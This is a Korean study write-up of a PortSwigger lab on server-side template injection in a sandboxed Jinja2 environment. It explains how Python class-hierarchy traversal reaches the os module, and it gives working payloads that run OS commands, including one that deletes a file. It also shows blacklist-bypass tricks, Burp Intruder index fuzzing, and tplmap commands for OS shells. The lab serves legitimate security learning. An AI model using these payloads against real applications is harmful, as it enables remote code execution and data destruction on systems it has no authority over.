# Lab: Server-side template injection in a sandboxed environment

## 개요

- **난이도**: Expert
- **주제**: Server-Side Template Injection — 샌드박스 우회 / Python 클래스 계층 탐색 / SSTI 퍼징
- **링크**: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment

## 목표

`import` 가 차단된 Jinja2 샌드박스 환경에서 Python 클래스 계층 탐색으로 `os` 모듈에 도달해 `/home/carlos/morale.txt` 를 삭제한다.

## 샌드박스(Sandbox) 란

```
[일반 Jinja2 환경]
  {{ ''.__class__ }}              → <class 'str'>
  {{ ''.__class__.__mro__ }}      → 클래스 계층 접근
  {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
  → OS 명령 실행 가능

[Jinja2 샌드박스 환경 (SandboxedEnvironment)]
  __import__() 차단
  __builtins__ 접근 제한
  특정 메서드/속성 블랙리스트 적용
  → 직접적인 import, eval 등 차단

  하지만:
  Python 의 객체 모델(클래스 계층)은 완전히 차단 불가
  → 간접 경로로 우회 가능
```

## Python 객체 모델 — 핵심 개념

### 모든 것은 객체

```python
# Python 에서 모든 것은 object 를 상속
"hello".__class__          # <class 'str'>
"hello".__class__.__mro__  # (<class 'str'>, <class 'object'>)
                            #  str 는 object 를 상속

# object 는 모든 클래스의 최상위 부모
# object.__subclasses__() → object 를 상속한 모든 클래스 목록
```

### 핵심 속성

```python
__class__         # 객체의 클래스
__mro__           # Method Resolution Order — 클래스 상속 체인
                  # str.__mro__ = (str, object)
__subclasses__()  # 해당 클래스를 직접 상속한 모든 클래스 목록
__init__          # 생성자 함수
__globals__       # 함수가 정의된 모듈의 전역 변수 딕셔너리
__builtins__      # Python 내장 함수 딕셔너리 (import 포함)
```

### os 모듈에 도달하는 경로

```python
# 1. 문자열 → str 클래스 → object → 모든 서브클래스
''.__class__                    # str
''.__class__.__mro__            # (str, object)
''.__class__.__mro__[1]         # object
''.__class__.__mro__[1].__subclasses__()  # [<class 'type'>, <class ...>, ...]

# 2. 서브클래스 중 os 모듈에 접근할 수 있는 클래스 탐색
# 많은 클래스들이 자신의 __init__.__globals__ 에 os 를 갖고 있음
some_class.__init__.__globals__['os']  # os 모듈 접근
some_class.__init__.__globals__['os'].popen('whoami').read()
```

## 공격 단계

### 1단계 — 서브클래스 목록 확인

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

출력 (일부):
```
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, ...,
 <class 'subprocess.Popen'>, ..., <class 'warnings.WarningMessage'>, ...]
```

수백 개의 클래스가 나열됨 → `os` 에 접근 가능한 클래스 인덱스 찾기 필요

### 2단계 — 적합한 클래스 탐색 (퍼징)

어떤 클래스가 `os` 를 `__globals__` 에 갖고 있는지 모름 → 인덱스를 변경하며 탐색:

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[400].__init__.__globals__ }}
```

또는 `warnings` 모듈 클래스를 이용한 방법:

```jinja2
{% for x in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'warning' in x.__name__ %}
    {{ x.__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}
  {% endif %}
{% endfor %}
```

### 3단계 — RCE 실행

`warnings.catch_warnings` 클래스가 `__builtins__` 를 통해 `__import__` 에 접근 가능한 대표적 예시:

```jinja2
{% for x in ''.__class__.__mro__[1].__subclasses__() %}
  {% if 'catch_warnings' in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os').popen('rm /home/carlos/morale.txt').read() }}
  {% endif %}
{% endfor %}
```

또는 인덱스 직접 지정:

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['os'].popen('rm /home/carlos/morale.txt').read() }}
```

## SSTI 퍼징 (Fuzzing)

### 퍼징이란

```
Fuzzing = 자동화된 입력 변형으로 취약점/동작을 탐색하는 기법

SSTI 퍼징에서:
  - 어떤 템플릿 구문이 동작하는지 탐색 (엔진 식별)
  - 어떤 클래스 인덱스가 유용한지 탐색
  - 어떤 속성/메서드가 블랙리스트에서 제외되어 있는지 탐색
```

### 1. 엔진 식별 퍼징

여러 구문을 체계적으로 시도:

```
테스트 목록:
  {{7*7}}          → 49: Jinja2/Twig/Django
  ${7*7}           → 49: FreeMarker/Mako/Groovy
  <%= 7*7 %>       → 49: ERB
  #{7*7}           → 49: Slim/Ruby
  ${{7*7}}         → 에러 메시지로 엔진 확인
  {{7*'7'}}        → 49: Jinja2 / 7777777: Twig
  {{'7'*7}}        → '7777777': Jinja2
```

### 2. 인덱스 퍼징 — 유효한 서브클래스 찾기

수백 개의 `__subclasses__()` 중 os 에 접근 가능한 인덱스 찾기:

**Burp Intruder 사용:**

```
페이로드 위치:
  {{ ''.__class__.__mro__[1].__subclasses__()[§0§].__init__.__globals__ }}

Intruder 설정:
  Attack type: Sniper
  Payload type: Numbers
  From: 0 / To: 500 / Step: 1

응답 필터:
  'os' 를 포함하는 응답 → 유효한 인덱스
```

**Python 스크립트로 로컬 확인:**

```python
import subprocess

# 로컬에서 서브클래스 목록 확인
subclasses = object.__subclasses__()
for i, cls in enumerate(subclasses):
    try:
        if 'os' in cls.__init__.__globals__:
            print(f"[{i}] {cls.__name__} → has 'os'")
        if '__builtins__' in cls.__init__.__globals__:
            print(f"[{i}] {cls.__name__} → has '__builtins__'")
    except AttributeError:
        pass
```

실행 결과 예시:
```
[214] _wrap_close → has 'os'
[232] catch_warnings → has '__builtins__'
[407] Quitter → has 'os'
```

→ 이 인덱스를 SSTI 페이로드에 적용

### 3. 속성 접근 퍼징 — 블랙리스트 우회 탐색

샌드박스가 `__class__` 를 차단할 경우 우회 방법 탐색:

```jinja2
{{ ''['__class__'] }}              문자열 키 접근
{{ ''|attr('__class__') }}         attr 필터
{{ getattr(x, '__class__') }}      getattr 함수
{{ ''.__class|e }}                 필터 체인으로 접근

{{ request.__class__ }}            다른 컨텍스트 변수 활용
{{ config.__class__ }}
{{ namespace().__class__ }}
```

### 4. tplmap — SSTI 자동화 도구

```bash
# tplmap: SSTI 자동 탐지 및 익스플로잇 도구
python tplmap.py -u 'http://TARGET/?name=*'

# 주요 기능
  - 자동 엔진 식별
  - 샌드박스 우회 시도
  - OS 명령 실행
  - 역쉘 생성

# 사용 예
python tplmap.py -u 'http://TARGET/?name=*' --os-cmd 'whoami'
python tplmap.py -u 'http://TARGET/?name=*' --os-shell
```

### 5. 퍼징 체크리스트

```
[엔진 식별]
  □ {{7*7}} 시도
  □ ${7*7} 시도
  □ <%= 7*7 %> 시도
  □ 폴리글랏 ${{<%'"}}%\ 시도

[샌드박스 여부 확인]
  □ {{ ''.__class__ }} 동작 여부
  □ {{ ''.__class__.__mro__ }} 동작 여부
  □ {{ ''.__class__.__mro__[1].__subclasses__() }} 동작 여부

[우회 경로 탐색]
  □ 서브클래스 목록에서 os/__builtins__ 보유 클래스 인덱스 확인
  □ __globals__ 에 os 포함된 클래스 탐색
  □ __builtins__['__import__'] 경로 탐색
  □ attr 필터, 문자열 키 접근으로 블랙리스트 우회
```

## 자주 사용되는 Python 클래스 경로

```python
# 경로 1: catch_warnings 를 통한 __builtins__ 접근
''.__class__.__mro__[1].__subclasses__()[IDX]._module.__builtins__['__import__']('os')

# 경로 2: os 모듈을 __globals__ 에 가진 클래스
''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['os']

# 경로 3: subprocess.Popen 직접 접근
''.__class__.__mro__[1].__subclasses__()[IDX]('whoami', shell=True, stdout=-1).communicate()

# 경로 4: __builtins__ 를 통한 __import__
''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['__builtins__']['__import__']('os')
```

## 샌드박스 환경별 우회 차이

| 차단 항목 | 우회 방법 |
|----------|---------|
| `import` 직접 호출 | `__builtins__['__import__']` 로 간접 호출 |
| `__class__` 속성 | `''['__class__']` 또는 `\|attr('__class__')` |
| `__subclasses__` | 다른 컨텍스트 변수(request, config 등) 활용 |
| 특정 인덱스 차단 | 같은 기능의 다른 클래스 인덱스 탐색 |
| `__globals__` | `__init__.__globals__` 등 중첩 접근 |

## 핵심 정리

- 샌드박스가 `import` 를 차단해도 Python 의 클래스 계층(`__class__`, `__mro__`, `__subclasses__()`)은 완전히 차단하기 어렵다.
- `object.__subclasses__()` 중 `__globals__` 에 `os` 또는 `__builtins__` 를 가진 클래스를 찾으면 `import` 없이 OS 명령 실행이 가능하다.
- 유효한 클래스 인덱스는 Burp Intruder 나 로컬 Python 스크립트로 퍼징해 찾는다.
- 퍼징은 엔진 식별, 클래스 인덱스 탐색, 블랙리스트 우회 모두에 사용되는 핵심 기법이다.

## 배운 점

### import 없이 os 에 도달하는 원리

```
[일반 접근 (차단됨)]
  import os
  os.popen('whoami')

[객체 탐색 접근 (샌드박스 우회)]
  모든 Python 객체는 클래스를 가짐
  클래스는 object 를 상속
  object 의 서브클래스들 중 일부는
  자신의 코드에서 이미 os 를 import 해서 사용 중
  → 그 클래스의 __globals__ 에 os 가 살아있음
  → 우리가 새로 import 하는 것이 아니라
    이미 import 된 os 를 가리키는 것

핵심:
  import 를 새로 하는 것이 아니라
  이미 import 된 모듈의 참조를 찾아가는 것
```
